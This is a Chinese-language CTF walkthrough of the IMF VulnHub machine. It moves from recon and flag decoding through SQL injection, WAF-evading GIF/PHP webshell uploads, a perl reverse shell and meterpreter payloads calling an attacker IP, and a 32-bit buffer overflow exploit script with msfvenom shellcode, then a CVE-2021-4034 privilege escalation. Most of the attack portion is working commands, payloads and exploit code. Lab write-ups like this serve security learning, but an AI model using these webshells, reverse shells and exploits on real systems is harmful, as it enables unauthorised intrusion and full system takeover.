1、nmap 10.211.55.0/24 -sP
MAC Address: 00:1C:42:AF:B0:BB (Parallels)
Nmap scan report for 10.211.55.36

2、nmap 10.211.55.36
80/tcp open  http


3、curl http://10.211.55.36/contact.php
发现flag1：
<!-- flag1{YWxsdGhlZmlsZXM=} -->
allthefiles


4、发现flag2
        <script src="js/ZmxhZzJ7YVcxbVl.js"></script>
        <script src="js/XUnRhVzVwYzNS.js"></script>
        <script src="js/eVlYUnZjZz09fQ==.min.js"></script>

ZmxhZzJ7YVcxbVlXUnRhVzVwYzNSeVlYUnZjZz09fQ==

echo 'ZmxhZzJ7YVcxbVlXUnRhVzVwYzNSeVlYUnZjZz09fQ==' | base64 -d                          
flag2{aW1mYWRtaW5pc3RyYXRvcg==} 
imfadministrator

5、访问：http://10.211.55.36/imfadministrator/
登录页面，尝试curl http://10.211.55.36/imfadministrator/
!-- I couldn't get the SQL working, so I hard-coded the password. It's still mad secure through. - Roger --

type="text" name="user"
type="password" name="pass"

无效的用户名，没信息了，回到最初页面看看contact us里还有啥信息

6、访问http://10.211.55.36/imfadministrator/
发现邮箱信息：
rmichaels@imf.local
akeith@imf.local
estone@imf.local
三个用户信息！这里有三个用户：rmichaels、akeith、estone

7、burpsuite测试用户名有效性
测试akeith、estone时候回显：Invalid username  （无效的用户名）
测试rmichaels回显：Invalid password（无效的密码）
找到了正确的用户名！

参考php strcmp比较字符串绕过：字符串和数组进行比较
http://www.atkx.top/2020/11/04/代码审计之弱类型绕过/

字符串转换为数组：
我将字段名称更新pass为pass[]，这意味着PHP将把这个字段解释为一个数组，而不是一个字符串。这有时会混淆验证字符串检查，如果输入是数组strcmp则会返回NULL！

pass[]   获得信息：
flag3{Y29udGludWVUT2Ntcw==}
Welcome, rmichaels
IMF CMS

获得flag3信息，解码：continueTOcms
发现这是IMF的CMS框架站！

点击IMF CMS进入：http://10.211.55.36/imfadministrator/cms.php?pagename=home

用burpsuite拦截流量包，右键点击：copy to file 保存到本地1.txt文本中！

8、sql注入

sqlmap -r 1.txt

sqlmap -r 1.txt --dump   ----可以获取数据库，但是无法获取shell
--dump:导出列里面的字段

获得两段信息：
./images/whiteboard.jpg
./images/redacted.jpg

http://10.211.55.36/imfadministrator/images/whiteboard.jpg
发现张图，图片左下角有二维码：微信扫码
flag4{dXBsb2Fkcjk0Mi5waHA=}
解码：uploadr942.php


9、文件上传-webshell

http://10.211.55.36/imfadministrator/uploadr942.php
该页面存在上传文件！

经过尝试允许上传jpg、png、gif
但是存在waf，利用双扩展名或空字符都无法绕过waf

参考文章：
https://stackoverflow.com/questions/3597082/how-is-a-website-hacked-by-a-maliciously-encoded-image-that-contained-a-php-scr

通过插入GIF89a十六​​进制标头并附加，WAF没有发现为恶意的php代码来创建一个gif文件。

-----------------
---方法1：
这里按照文章方法，然后双引号、单引号都无法利用绕过waf，这里参考文章：
https://blog.csdn.net/vspiders/article/details/70162604
反引号中，变量转义作为shell命令被执行！

GIF89a
<?php echo `id`; ?>     ----对应998f21dbfbe3
回显：File successfully uploaded.  成功绕过waf！

访问：
curl http://10.211.55.36/imfadministrator/uploads/dfd51a9eaf43.gif

-------
接下来使用echo和print加反引号来写入一句话，绕过waf：

GIF89a 
<?php echo `id`); ?>

GIF89a      
<?php $dayu=$_GET['dayu']; print(`$dayu`); ?>

或者：<?php $dayu=$_GET['dayu']; echo `$dayu`; ?>

curl http://10.211.55.36/imfadministrator/uploads/bf12807d791f.gif?dayu=id
这时候正常访问id输出信息！

-------
拓展知识，参考文章：
https://zhuanlan.zhihu.com/p/25049406
知道JPG／JPEG文件会是FFD8FFE0为文件头！
-------
echo 'FFD8FFE1' | xxd -r -p > test1.gif
echo '<?php $dayu=$_GET['dayu']; echo `$dayu`; ?>' >> dayu.gif

xxd创建一个hexdump，使用组合-r和-p读取没有行号信息和特定列布局的普通十六进制转储。
-------

浏览器访问：
http://10.211.55.36/imfadministrator/uploads/bf12807d791f.gif?cmd=cat flag5_abc123def.txt
获得flag5：flag5{YWdlbnRzZXJ2aWNlcw==} 
base64解码获得：agentservices

反弹shell：
cp /usr/share/webshells/php/php-reverse-shell.php .   ----复制phpshell到本文件夹
python -m SimpleHTTPServer 8081   ----开启http服务
http://10.211.55.36/imfadministrator/uploads/bf12807d791f.gif?cmd=wget%20http://10.211.55.19:8081/php-reverse-shell.php
wget下载phpwebshell到uoload目录！

nc -vlp 1234
http://10.211.55.36/imfadministrator/uploads/php-reverse-shell.php  ----访问
成功获得反弹shell！
----------------------
方法2：
weevely  


weevely generate passdayu dayu.php   ---生成dayu.php文件密码为passdayu
generate  ---生成新代理
mv dayu.php dayu.gif    ---然后头部加入GIF98a并改名文件为gif

然后上传文件，看源码ID：ff075cd8aeef
weevely http://10.211.55.36/imfadministrator/uploads/ff075cd8aeef.gif passdayu
成功获得shell，该shell很稳定！

------------------
方法3：webacoo   ---测试无法绕过waf！！！！！


webacoo -g -o dayu1.php
-g 生成后门代码（需要-o）
-o OUTPUT 生成的后门输出文件名

和方法2一样，加入GIF98a然后改名dayu1.gif，查看ID：

webacoo -t -u http://x.x/.login.php

-t 建立远程“终端”连接（需要-u）
-u URL 后门 URL 

测试无法绕过waf！！！！！

------------------
方法4：  测试无法绕过waf！！！！！
Msf-php-维持shell

```
//生成webshell
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.211.55.19 LPORT=4455 -f raw > ms.php

//监听
msfconsole
use exploit/multi/handler
set payload php/meterpreter_reverse_tcp
set LHOST 10.211.55.19
set LPORT 4455
run
```
测试无法绕过waf！！！！！
-------------------
为什么该文件上传允许gif解析php？？
cd /var/www/html/imfadministrator/uploads ---进入文件上传目录
ls -la  ---查看到存在.htaccess
cat查看信息：
AddType application/x-httpd-php .php .gif
AddHandler application/x-httpd-php .gif
可看到该文件与继续gif解析php文件！

建议反弹个稳定的/bin/bash的shell回来控制：
nc -vlp 6677

perl -e 'use Socket;$i="10.211.55.19";$p=6677;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

python3 -c 'import pty; pty.spawn("/bin/bash")'    ----环境仅安装了python3
ctrl+z
stty raw -echo
fg
这时候就完成了一个非常稳定的shell了！继续渗透！


10、缓冲区溢出-提权
通过flag5 base64解码获得：agentservices
这是提示agent的服务存在问题！

find / -name agent 2>/dev/null    发现：
/usr/local/bin/agent
/etc/xinetd.d/agent

访问：/usr/local/bin/agent
是可以访问的，并且需要输入数值ID！

netstat -ant    ---查看开启的端口情况
nc 127.0.0.1 7788    ---查看到开启7788端口是anget程序的

base64 agent       ----转码base64
gedit base64.txt   ----将base64信息放入
cat base64.txt | base64 -d > agent   ----base64转码为文件

md5sum agent                                  
fabc1afd43f668df0b812213567d032c  agent
查看MD5值没问题！

然后在目录下发现：
cat access_codes
SYN 7482,8279,9467

这是和项目六一样的端口敲震!敲震后本地就可以访问项目靶场环境的7788了！

先继续分析本地kali上的agent!
使用ltrace（跟踪进程调用库函数的情况）查看agent信息：

ltrace ./agent
随意输入数字！
strncmp("dwqdq\n", "48093572", 8)  = -1 ----正在将我提供的字符串与字符串48093572进行比较，在这种情况下导致=-1）

为了防止缓冲区溢出这种情况的出现，在C库函数中，许多对字符串操作的函数都有其"n兄弟"版本，例如strncmp，strncat，snprintf……兄弟版本的基本行为不变，但是通常在参数中需要多给出一个整数n，用于限制操作的最大字符数量。

甚至strings agent发现：两个地方使用了“%s”，这很可能是一个有效的溢出点！

vmmap
0xfffdc000 0xffffe000 rwxp      [stack]
发现这是个栈溢出的题目！

/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2000
gdb ./agent
run
48093572    
输入后：
Main Menu:
1. Extraction Points
2. Request Extraction
3. Submit Report
0. Exit
选择Submit Report 3：

输入2000值后，发现segmentation fault溢出报错！存在缓冲区溢出！
0x41366641

还发现：堆栈开始是EAX寄存器
EAX: 0xffffcfd4 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASA\324\317\377\377TAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"...)

/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 41366641
发现偏移量为：168

python -c 'print "A" * 168 + "B" * 4'
通过测试：
EAX: 0xffffcfd4 ('A' <repeats 152 times>, "\324\317\377\377", 'A' <repeats 15 times>, "BBBB")
EIP被168个字节覆盖，但是多给的B字节走到了EAX上，在给多个C测试shellcode会走哪儿！

python -c 'print "A" * 168 + "B" * 4 + "CCCCCCCCCCCCCCCC"'
EAX: 0xffffcfd4 ('A' <repeats 152 times>, "\324\317\377\377", 'A' <repeats 12 times>, "BBBB", 'C' <repeats 16 times>)

或者：
info registers eax
x/20x $eax -32
这时候可看到：
0xffffcfc4:     0xffffcfd4      0x00000001      0x00000000      0x0804b02c
0xffffcfd4:     0x41414141      0x41414141      0x41414141      0x41414141
......

C也走到了EAX，找保护措施！那么只需要找到eax值，即可直接跳到shellcode！


checksec
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : Partial
RELRO 是一种用于加强对 binary 数据段的保护的技术。
参考：https://lantern.cool/note-pwn-linux-protect/

查看ASLR设置：
cat /proc/sys/kernel/randomize_va_space
2
或者：
sysctl -a --pattern randomize
kernel.randomize_va_space = 2

0 = 关闭
1 = 半随机。共享库、栈、mmap() 以及 VDSO 将被随机化。（留坑，PIE会影响heap的随机化。。）
2 = 全随机。除了1中所述，还有heap。
说明存在随机化！ASLR功能的程序使用ret2reg（返回寄存器）指令来利用缓冲区溢出
参考大佬：
https://www.securitylab.ru/analytics/405868.php

gdb-peda$ jmpcall eax
0x8048563 : call eax

或者：asmsearch "jmp eax"
asmsearch "call eax"

EAX 地址0x8048563

目前知道了JMP值：0x8048563
偏移量：168
接下来创建shellcode写个脚本就直接拿下！


接下来创建后门：避免使用空字符和换行符
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.211.55.19 LPORT=6666 -f python -b "\x00\x0a\x0b"

payload：
-p 载荷类型
LHOST 本机地址
LPORT
-b 坏字符
-f 编译的语言
\x00 == 0x00 ASCII控制字符表中对应 NULL (空字符)
\x0a == 0X0a ASCII控制字符表中对应 LF （换行键）
\x0b == 0x0b ASCII控制字符表中对应 VT (垂直定位符号)

获得：
buf =  b""
buf += b"\xdb\xda\xd9\x74\x24\xf4\xbb\x99\x95\x96\x1f\x58\x33"
buf += b"\xc9\xb1\x12\x31\x58\x17\x83\xe8\xfc\x03\xc1\x86\x74"
buf += b"\xea\xc0\x73\x8f\xf6\x71\xc7\x23\x93\x77\x4e\x22\xd3"
buf += b"\x11\x9d\x25\x87\x84\xad\x19\x65\xb6\x87\x1c\x8c\xde"
buf += b"\x1d\x0c\x59\x0d\x4a\xb0\xa6\x2b\x80\x3d\x47\xfb\xf2"
buf += b"\x6d\xd9\xa8\x49\x8e\x50\xaf\x63\x11\x30\x47\x12\x3d"
buf += b"\xc6\xff\x82\x6e\x07\x9d\x3b\xf8\xb4\x33\xef\x73\xdb"
buf += b"\x03\x04\x49\x9c"

需要运行，在输入密码，在输入ID，才能进行缓冲区溢出，这时候需要expect的特殊脚本语言来写：
https://en.wikipedia.org/wiki/Expect

最终代码：exp.py
------------------------------
import socket
dayu = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # 面向网络的套接字
dayu.connect(('10.211.55.36', 7788))  # 连接
client.recv(512)
dayu.send("48093572\n")  # 发送密码，并按enter
client.recv(512)
dayu.send("3\n")   # 选择选项 3 并输入
client.recv(512)

# shellcode from msfvenom  msf的shellcode木马
buf =  b""
buf += b"\xdb\xda\xd9\x74\x24\xf4\xbb\x99\x95\x96\x1f\x58\x33"
buf += b"\xc9\xb1\x12\x31\x58\x17\x83\xe8\xfc\x03\xc1\x86\x74"
buf += b"\xea\xc0\x73\x8f\xf6\x71\xc7\x23\x93\x77\x4e\x22\xd3"
buf += b"\x11\x9d\x25\x87\x84\xad\x19\x65\xb6\x87\x1c\x8c\xde"
buf += b"\x1d\x0c\x59\x0d\x4a\xb0\xa6\x2b\x80\x3d\x47\xfb\xf2"
buf += b"\x6d\xd9\xa8\x49\x8e\x50\xaf\x63\x11\x30\x47\x12\x3d"
buf += b"\xc6\xff\x82\x6e\x07\x9d\x3b\xf8\xb4\x33\xef\x73\xdb"
buf += b"\x03\x04\x49\x9c"

# padding  填充字符
buf += "A" * (168 - len(buf))

# call eax gadget 调用eax jmp
buf += "\x63\x85\x04\x08\n"
dayu.send(buf)


解释：
client.recv(512) 中recv是recvsize的缩写，参考：https://blog.csdn.net/momod/article/details/105883550   当使用socket模块，在接收请求数据时一般用s.recv()函数。这个函数有一个bufsize参数，指定要接受的最大数据量。一般教程会推荐设定这个值为1024。如这个简单的服务器代码：
当修改bufsize，小于一定长度，比如128，运行后访问127.0.0.1：8080，网页不会报错，但不显示任何内容。
或者参考：https://docs.python.org/3/library/socket.html
------------------------------

最终代码2：exp2.py
------------------------------
import socket
 
# Target related variables
remotehost = "10.211.55.36"
remoteport = 7788
menuoption = 3
agentid = 48093572
 
# Default recv size
recvsize = 512
 
# Connnect to remote host
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((remotehost, remoteport))
client.recv(recvsize)
client.send("{0}\n".format(agentid))
client.recv(recvsize)
client.send("{0}\n".format(menuoption))
client.recv(recvsize)
 
# Payload genereated by Msfvenom, to be force fed into reporting tool
buf =  b""
buf += b"\xdb\xda\xd9\x74\x24\xf4\xbb\x99\x95\x96\x1f\x58\x33"
buf += b"\xc9\xb1\x12\x31\x58\x17\x83\xe8\xfc\x03\xc1\x86\x74"
buf += b"\xea\xc0\x73\x8f\xf6\x71\xc7\x23\x93\x77\x4e\x22\xd3"
buf += b"\x11\x9d\x25\x87\x84\xad\x19\x65\xb6\x87\x1c\x8c\xde"
buf += b"\x1d\x0c\x59\x0d\x4a\xb0\xa6\x2b\x80\x3d\x47\xfb\xf2"
buf += b"\x6d\xd9\xa8\x49\x8e\x50\xaf\x63\x11\x30\x47\x12\x3d"
buf += b"\xc6\xff\x82\x6e\x07\x9d\x3b\xf8\xb4\x33\xef\x73\xdb"
buf += b"\x03\x04\x49\x9c"
 
# Buffer is too small to trigger overflow. Fattening it up!
# 168 is the offset I found using pattern_offset
buf += "A" * (168 - len(buf))
 
# EAX call I made note of earlier in this segment
buf += "\x63\x85\x04\x08\n"
 
# And off we go!
client.send(buf)
------------------------------



敲震端口：
knock 10.211.55.36 7482 8279 9467
nmap 10.211.55.36 -p7788     ----这时候7788端口开启

nc -vlp 6666
python exp.py


root@imf:/root# cat Flag.txt
cat Flag.txt
flag6{R2gwc3RQcm90MGMwbHM=}
Gh0stProt0c0ls

-------------
11、提权：

lsb_release -a
发现这是16.4的乌班图版本！


python -m SimpleHTTPServer 8081
wget http://10.211.55.19:8081/cve-2021-4034-poc.c
gcc cve-2021-4034-poc.c -o dayu
chmod +x dayu
./dayu

------
12、深入分析
gdb agent
disassemble main
0x080486ba <+191>:   call   0x80484e0 <strncmp@plt>
发现在内存地址80486ba处，发生了字符串比较函数，所以在那里添加了一个断点:
break *0x80486ba
随意输入1234等字符查看：
info registers
esp            0xffffd070

查看starck指针上方的四个半字的内存：
x/4xw 0xffffd070
0xffffd070:     0xffffd08e      0x0804c210      0x00000008      0xf7df390e
gdb-peda$ x/s 0xffffd08e
0xffffd08e:     "1234\n"
gdb-peda$ x/s 0x0804c210
0x804c210:      "48093572"
可以看到在断点比较函数，执行1234\n后，在内存地址0804c210中我们找到了访问程序的密码！




---------
13、教学如果写py脚本对付缓冲区溢出

参考文章：
https://zhuanlan.zhihu.com/p/387321917

脚本：
https://github.com/hum4nG0D/OSCP_Bufferovrflw_Prep
https://github.com/corelan/mona

14、拓展小知识
1）绕过waf
https://www.secjuice.com/php-rce-bypass-filters-sanitization-waf/
可以用十六进制格式对系统函数进行编码以避免检测：
我使用Cyber​​chef 工具网站将函数名称转换为十六进制，并将以下请求传递给上传表单：
https://gchq.github.io/CyberChef/#recipe=To_Hex('%5C%5Cx',0)&input=c3lzdGVt
system替换为：\x73\x79\x73\x74\x65\x6d


缓冲区溢出非常好的文章：
https://secnigma.wordpress.com/2021/04/05/an-introduction-into-linux-buffer-overflow/


pattern_create 300
pattern_offset 0x74414156

找jmp eax拓展方法：
1）使用 gdb 的 asmsearch "opcode"功能
2）利用objdump -D agent | grep call| grep eax
3）使用ropshell.com：将二进制文件上传到ropshell.com并直接在网站内搜索操作码
http://ropshell.com/ropsearch?h=fabc1afd43f668df0b812213567d032c&p=call+eax


python3的exp：
https://github.com/secnigma/my_exploits/blob/main/imf/exploit-python3.py
作者：
https://secnigma.wordpress.com/2021/04/19/oscp-like-vulnhub-machines-imf-1/

或者用pattern_search查看：
EIP+0 found at offset: 168

Registers point to pattern buffer:
[EAX] --> offset 0 - size ~215
[ESP] --> offset 172 - size ~128



IDA打开agent，进入main函数：按TAB键伪C代码编译
  asprintf(&s2, "%i", 48093572);

然后进入：
      case 3:
        report();
report查看：
----------
char *report()
{
  char s; // [esp+4h] [ebp-A4h]

  printf("\nEnter report update: ");
  gets(&s);
  printf("Report: %s\n", &s);
  puts("Submitted for review.");
  return &s;
}
-----------
提示根据项目启动内容！















